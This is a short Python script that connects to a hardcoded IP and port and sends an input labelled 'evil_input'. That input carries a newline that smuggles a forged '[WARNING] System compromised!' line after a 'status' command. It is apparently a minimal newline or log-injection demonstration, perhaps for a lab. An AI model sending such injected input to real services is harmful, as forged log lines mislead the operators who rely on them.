import socket

TARGET_IP = '192.161.1.2'
TARGET_PORT = 8888

evil_input = "status\n[WARNING] System compromised!\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET_IP, TARGET_PORT))
s.sendall(evil_input.encode())

print(s.recv(4096).decode())
s.close()
